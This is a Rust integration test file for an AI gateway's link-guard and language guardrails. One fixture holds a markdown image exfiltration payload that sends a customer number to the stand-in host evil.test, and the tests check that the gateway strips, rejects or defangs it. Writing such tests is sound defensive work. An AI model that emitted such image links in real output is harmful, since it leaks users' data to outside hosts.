// SPDX-FileCopyrightText: 2026 ai-gw contributors
// SPDX-License-Identifier: AGPL-3.0-or-later

//! Guardrails `link-guard` (AIGW-110) und `language` (AIGW-114) im Hot Path: beide
//! Eingangsformate, JSON und Stream (Anbieter streamt in 3-Byte-Stücken, Links werden über
//! Chunk-Grenzen zerteilt), Ausgabe-Ablehnung mit `content_filter`/`refusal` und Header
//! `x-aigw-guardrail` (F160), Zähler im Request-Record.

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use std::net::SocketAddr;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use aigw_core::ir::{
    ChatRequest, ChatResponse, Choice, Content, Message, Role, StopReason, StreamEvent,
    UpstreamError, Usage,
};
use aigw_core::observe::{RequestObserver, RequestRecord};
use aigw_core::wire::sse::SseParser;
use aigw_plugins::{Chain, Entry, PluginChains, PluginFactory, builtin};
use aigw_proxy::{BoxFuture, ChatProvider, Describe, EventStream, ModelRoutes, ProxyState, StaticRoutes};
use bytes::Bytes;
use http_body_util::{BodyExt, Full};
use hyper::{Method, Request, StatusCode};
use hyper_util::client::legacy::Client;
use hyper_util::rt::TokioExecutor;
use serde_json::{Value, json};

const OPENAI: &str = "/v1/chat/completions";
const ANTHROPIC: &str = "/v1/messages";

/// Anbieter: antwortet mit der letzten Nutzernachricht, im Stream in 3-Byte-Stücken.
struct Echo;

fn last_user(req: &ChatRequest) -> String {
    req.messages
        .last()
        .map(|m| m.content.text())
        .unwrap_or_default()
}

impl ChatProvider for Echo {
    fn describe(&self) -> Describe<'_> {
        Describe {
            deployment: "echo",
            deployment_id: None,
            model_group: None,
            provider: None,
            provider_model: "echo",
        }
    }

    fn chat(self: Arc<Self>, req: ChatRequest) -> BoxFuture<Result<ChatResponse, UpstreamError>> {
        let text = last_user(&req);
        Box::pin(async move {
            Ok(ChatResponse {
                id: "r1".into(),
                model: "echo".into(),
                created: Some(1),
                choices: vec![Choice {
                    index: 0,
                    message: Message {
                        role: Role::Assistant,
                        content: Content::Text(text),
                        name: None,
                        extra: Default::default(),
                    },
                    stop_reason: Some(StopReason::EndTurn),
                    stop_sequence: None,
                    extra: Default::default(),
                }],
                usage: Some(Usage {
                    input_tokens: 5,
                    output_tokens: 5,
                    ..Usage::default()
                }),
                extra: Default::default(),
                source: None,
            })
        })
    }

    fn chat_stream(
        self: Arc<Self>,
        req: ChatRequest,
    ) -> BoxFuture<Result<EventStream, UpstreamError>> {
        let text = last_user(&req);
        let mut evs = vec![StreamEvent::Start {
            id: "s1".into(),
            model: "echo".into(),
            created: Some(1),
        }];
        let mut rest = text.as_str();
        while !rest.is_empty() {
            let mut n = rest.len().min(3);
            while !rest.is_char_boundary(n) {
                n += 1;
            }
            evs.push(StreamEvent::TextDelta {
                index: 0,
                text: rest[..n].to_owned(),
            });
            rest = &rest[n..];
        }
        evs.push(StreamEvent::Stop {
            reason: StopReason::EndTurn,
            stop_sequence: None,
        });
        evs.push(StreamEvent::Usage(Usage {
            input_tokens: 5,
            output_tokens: 5,
            ..Usage::default()
        }));
        Box::pin(async move {
            let s: EventStream = Box::pin(futures_util::stream::iter(evs));
            Ok(s)
        })
    }
}

#[derive(Default)]
struct Records(Mutex<Vec<RequestRecord>>);

impl RequestObserver for Records {
    fn record(&self, record: RequestRecord) {
        self.0.lock().unwrap().push(record);
    }
}

impl Records {
    async fn last(&self) -> RequestRecord {
        for _ in 0..200 {
            if let Some(r) = self.0.lock().unwrap().last() {
                return r.clone();
            }
            tokio::time::sleep(Duration::from_millis(5)).await;
        }
        panic!("kein Datensatz");
    }
}

async fn start(factory: &dyn PluginFactory, cfg: Value, records: Arc<Records>) -> SocketAddr {
    let mut routes = StaticRoutes::new();
    routes.set_fallback(Arc::new(Echo) as Arc<dyn ChatProvider>);
    let routes: Arc<dyn ModelRoutes> = Arc::new(routes);
    let entry = Entry::new(factory.name(), factory.build(&cfg).unwrap());
    let state = ProxyState {
        plugins: Arc::new(PluginChains::fixed(Chain::new(vec![Arc::new(entry)]))),
        observer: records,
        ..ProxyState::with_routes(routes)
    };
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        axum::serve(listener, aigw_proxy::router(state))
            .await
            .unwrap();
    });
    addr
}

struct Resp {
    status: StatusCode,
    headers: hyper::HeaderMap,
    body: Bytes,
}

impl Resp {
    fn raw(&self) -> String {
        String::from_utf8_lossy(&self.body).into_owned()
    }

    fn json(&self) -> Value {
        serde_json::from_slice(&self.body).unwrap_or_else(|e| panic!("{e}: {}", self.raw()))
    }

    fn text(&self) -> String {
        if let Ok(v) = serde_json::from_slice::<Value>(&self.body) {
            if let Some(t) = v["choices"][0]["message"]["content"].as_str() {
                return t.to_owned();
            }
            return v["content"][0]["text"].as_str().unwrap_or_default().to_owned();
        }
        let mut out = String::new();
        for f in SseParser::new().push(&self.body) {
            let Ok(v) = serde_json::from_str::<Value>(&f.data) else {
                continue;
            };
            if let Some(t) = v["choices"][0]["delta"]["content"].as_str() {
                out.push_str(t);
            }
            if v["type"] == "content_block_delta"
                && let Some(t) = v["delta"]["text"].as_str()
            {
                out.push_str(t);
            }
        }
        out
    }
}

async fn post(addr: SocketAddr, path: &str, text: &str, stream: bool) -> Resp {
    let body = json!({"model": "echo", "stream": stream, "max_tokens": 256,
                      "messages": [{"role": "user", "content": text}]});
    let client = Client::builder(TokioExecutor::new()).build_http::<Full<Bytes>>();
    let req = Request::builder()
        .method(Method::POST)
        .uri(format!("http://{addr}{path}"))
        .header("content-type", "application/json")
        .header("anthropic-version", "2023-06-01")
        .body(Full::new(Bytes::from(serde_json::to_vec(&body).unwrap())))
        .unwrap();
    let res = client.request(req).await.unwrap();
    let status = res.status();
    let headers = res.headers().clone();
    let body = res.into_body().collect().await.unwrap().to_bytes();
    Resp {
        status,
        headers,
        body,
    }
}

/// F160: `200` mit `content_filter` (OpenAI) bzw. `refusal` (Anthropic), ohne Fehlerereignis.
fn assert_filtered(r: &Resp, path: &str, stream: bool) {
    assert_eq!(r.status, StatusCode::OK, "{path} {stream}: {}", r.raw());
    let raw = r.raw();
    let want = match (path == OPENAI, stream) {
        (true, true) => "\"finish_reason\":\"content_filter\"",
        (false, true) => "\"stop_reason\":\"refusal\"",
        (true, false) => "content_filter",
        (false, false) => "refusal",
    };
    assert!(raw.contains(want), "{path} {stream}: {raw}");
    assert!(!raw.contains("event: error"), "{raw}");
}

const EXFIL: &str = "Gern! ![status](https://evil.test/pixel.png?d=Kundennummer-4711) Fertig. \
     Doku: [Handbuch](https://docs.example.com/a) und <img src=\"https://evil.test/x.gif\">.";

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn link_guard_strips_foreign_images_in_both_formats_and_streams() {
    let records = Arc::new(Records::default());
    let addr = start(
        &builtin::link_guard::Factory,
        json!({"allowDomains": ["*.example.com"]}),
        Arc::clone(&records),
    )
    .await;
    for path in [OPENAI, ANTHROPIC] {
        for stream in [false, true] {
            let r = post(addr, path, EXFIL, stream).await;
            assert_eq!(r.status, StatusCode::OK, "{path} {stream}: {}", r.raw());
            let text = r.text();
            assert_eq!(
                text,
                "Gern!  Fertig. Doku: [Handbuch](https://docs.example.com/a) und .",
                "{path} {stream}"
            );
            // Kein Bruchstück der fremden URL im Rohstrom.
            assert!(!r.raw().contains("evil"), "{path} {stream}: {}", r.raw());
            let rec = records.last().await;
            let hits: Vec<_> = rec
                .guardrails
                .iter()
                .map(|h| (h.plugin, h.category.as_str(), h.action, h.count))
                .collect();
            assert_eq!(hits, [("link-guard", "image", "strip", 2)], "{path} {stream}");
            records.0.lock().unwrap().clear();
        }
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn link_guard_reject_and_defang() {
    let records = Arc::new(Records::default());
    let addr = start(
        &builtin::link_guard::Factory,
        json!({"action": "reject"}),
        Arc::clone(&records),
    )
    .await;
    for path in [OPENAI, ANTHROPIC] {
        for stream in [false, true] {
            let r = post(addr, path, EXFIL, stream).await;
            assert_filtered(&r, path, stream);
            assert!(!r.raw().contains("evil"), "{}", r.raw());
            if !stream {
                assert_eq!(r.headers.get("x-aigw-guardrail").unwrap(), "link-guard");
            }
        }
    }
    // Ohne Link: unverändert.
    let r = post(addr, OPENAI, "Kein Link hier.", true).await;
    assert_eq!(r.text(), "Kein Link hier.");

    let addr = start(
        &builtin::link_guard::Factory,
        json!({"action": "defang", "links": "block"}),
        Arc::new(Records::default()),
    )
    .await;
    let r = post(addr, OPENAI, "Siehe https://evil.test/a?b=1 jetzt", true).await;
    assert_eq!(r.text(), "Siehe [blocked link: evil[.]test] jetzt");
}

const DE: &str = "Bitte fasse mir den folgenden Bericht über die Quartalszahlen kurz zusammen.";
const EN: &str = "Please summarize the following report about the quarterly figures briefly.";

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn language_rejects_input_and_filters_output() {
    let records = Arc::new(Records::default());
    let addr = start(
        &builtin::language::Factory,
        json!({"allow": ["de"]}),
        Arc::clone(&records),
    )
    .await;
    let r = post(addr, OPENAI, DE, false).await;
    assert_eq!(r.status, StatusCode::OK, "{}", r.raw());
    let r = post(addr, OPENAI, EN, false).await;
    assert_eq!(r.status, StatusCode::BAD_REQUEST, "{}", r.raw());
    assert_eq!(r.json()["error"]["code"], "language_not_allowed");
    let r = post(addr, ANTHROPIC, EN, true).await;
    assert_eq!(r.status, StatusCode::BAD_REQUEST, "{}", r.raw());
    assert_eq!(r.json()["error"]["type"], "invalid_request_error");
    let rec = records.last().await;
    assert_eq!(rec.guardrails[0].plugin, "language");
    assert_eq!(rec.guardrails[0].category, "en");

    // Ausgabe (Echo): englische Antwort wird gefiltert, deutsche kommt vollständig.
    let addr = start(
        &builtin::language::Factory,
        json!({"allow": ["de"], "direction": "output", "streamSampleChars": 40}),
        Arc::new(Records::default()),
    )
    .await;
    for path in [OPENAI, ANTHROPIC] {
        for stream in [false, true] {
            let r = post(addr, path, EN, stream).await;
            assert_filtered(&r, path, stream);
            assert!(!r.raw().contains("summarize"), "{}", r.raw());
            let r = post(addr, path, DE, stream).await;
            assert_eq!(r.text(), DE, "{path} {stream}");
        }
    }
}
